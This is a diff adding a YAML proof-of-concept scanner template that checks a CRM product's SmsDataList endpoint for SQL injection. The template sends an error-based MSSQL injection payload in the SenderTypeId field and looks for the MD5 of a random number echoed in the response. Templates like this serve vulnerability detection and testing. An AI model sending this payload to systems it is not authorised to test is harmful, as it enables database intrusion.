@@ -1,0 +1,21 @@
+name: poc-yaml-crm-smsdatalist-sql
+manual: true
+transport: http
+set:
+    s1: randomInt(10000, 99999)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /SMS/SmsDataList/?pageIndex=1&pageSize=30
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'%20and%201=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{s1}}'))))%20AND%20'CvNI'='CvNI
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.icontains(md5(string(s1))) && response.body_string.icontains("\"message\":")
+expression: r0()
+detail:
+    author: 小r
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/32024c5dbb7ff60fa7347cccf6ebb3763a513e7a/docs/wiki/webapp/%E4%BB%BB%E6%88%91%E8%A1%8C/%E4%BB%BB%E6%88%91%E8%A1%8C%20CRM%20SmsDataList%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1
